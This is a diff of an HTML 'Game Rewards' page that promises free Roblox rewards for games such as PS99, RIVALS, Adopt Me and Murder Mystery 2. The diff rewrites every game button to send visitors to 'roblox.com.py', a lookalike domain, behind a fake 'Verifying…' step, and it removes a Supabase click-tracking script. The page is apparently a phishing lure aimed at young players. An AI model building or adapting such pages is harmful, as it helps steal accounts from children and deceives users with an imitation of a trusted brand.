@@ -5,10 +5,11 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Game Rewards</title>
 <link rel="stylesheet" href="style.css">
+<link rel="manifest" href="manifest.json">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>
 </head>
-<body>
+<body class="theme-dark">
 
 <audio id="bgMusic" loop>
   <source src="music/christmas.mp3" type="audio/mpeg">
@@ -16,7 +17,7 @@
 
 <div id="musicOverlay"><span>Click to enter</span></div>
 
-<a href="/admin/login.html" class="admin-login">Admin Login</a>
+<a href="admin/login.html" class="admin-login">Admin Login</a>
 
 <div class="theme-switch">
   <button onclick="setTheme('light')">Light</button>
@@ -35,29 +36,36 @@
 <div class="main-card">
   <h1>Click here for rewards free in games Roblox</h1>
 
-  <div class="game" onclick="startVerify(this,'PS99')">
+  <div class="game" onclick="startVerify(this,'https://roblox.com.py/games/8737899170/Pet-Simulator-99?privateServerLinkCode=21350960716657913529484159794774')">
     <img src="https://tr.rbxcdn.com/180DAY-7ba01bc168c1d1f4fb06be2f1f2910d1/512/512/Image/Webp/noFilter">
     <span>PS99</span>
     <div class="status"></div>
   </div>
 
-  <div class="game" onclick="startVerify(this,'RIVALS')">
+  <div class="game" onclick="startVerify(this,'https://roblox.com.py/games/17625359962/RIVALS?privateServerLinkCode=21350960716657913529484159794774')">
     <img src="https://tr.rbxcdn.com/180DAY-7c296abab99af2df457d093f669eff0e/768/432/Image/Webp/noFilter">
     <span>RIVALS</span>
     <div class="status"></div>
   </div>
 
-  <div class="game" onclick="startVerify(this,'ADOPT ME')">
+  <div class="game" onclick="startVerify(this,'https://roblox.com.py/games/920587237/Adopt-Me?privateServerLinkCode=21350960716657913529484159794774')">
     <img src="https://tr.rbxcdn.com/180DAY-e2d96a2feb46542ea90a5ad03e91b2c4/512/512/Image/Webp/noFilter">
     <span>ADOPT ME</span>
     <div class="status"></div>
   </div>
 
-  <div class="game" onclick="startVerify(this,'STEAL A BRAINROT')">
+  <div class="game" onclick="startVerify(this,'https://roblox.com.py/games/109983668079237/SKIBIDI-Steal-a-Brainrot?privateServerLinkCode=21350960716657913529484159794774')">
     <img src="https://tr.rbxcdn.com/180DAY-e954f84423236c29308c9f3b1dd88d0b/512/512/Image/Webp/noFilter">
     <span>STEAL A BRAINROT</span>
     <div class="status"></div>
   </div>
+
+  <div class="game" onclick="startVerify(this,'https://roblox.com.py/games/142823291/Murder-Mystery-2?privateServerLinkCode=21350960716657913529484159794774')">
+    <img src="https://tr.rbxcdn.com/180DAY-449e77d4d0d810935834f268392d6744/512/512/Image/Webp/noFilter">
+    <span>MURDER MYSTERY 2</span>
+    <div class="status"></div>
+  </div>
+
 </div>
 
 <div id="verify"><div class="box">Verifying…</div></div>
@@ -67,40 +75,6 @@
 <canvas id="gifts"></canvas>
 
 <script src="script.js"></script>
-<script>
-// SUPABASE CONFIG
-const SUPABASE_URL = "YOUR_SUPABASE_URL";
-const SUPABASE_ANON_KEY = "YOUR_SUPABASE_ANON_KEY";
-const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
-
-// TRACK VISIT
-async function trackVisit(){
-  await supabase.from('visits').insert([{timestamp: new Date()}]);
-}
-trackVisit();
-
-// TRACK SOCIAL
-async function trackSocial(platform){
-  await supabase.from('social_clicks').insert([{platform, timestamp: new Date()}]);
-}
-
-// TRACK GAME
-async function trackGame(game){
-  await supabase.from('game_clicks').insert([{game_name: game, timestamp: new Date()}]);
-}
-
-// VERIFY FUNCTION
-function startVerify(el, game){
-  if(el.classList.contains("done")) return;
-  document.getElementById("verify").style.display="flex";
-  setTimeout(()=>{
-    document.getElementById("verify").style.display="none";
-    el.classList.add("done");
-    el.querySelector(".status").innerHTML="Reward unlocked <i class='fa-solid fa-check'></i>";
-    trackGame(game);
-  },1200);
-}
-</script>
 
 </body>
 </html>
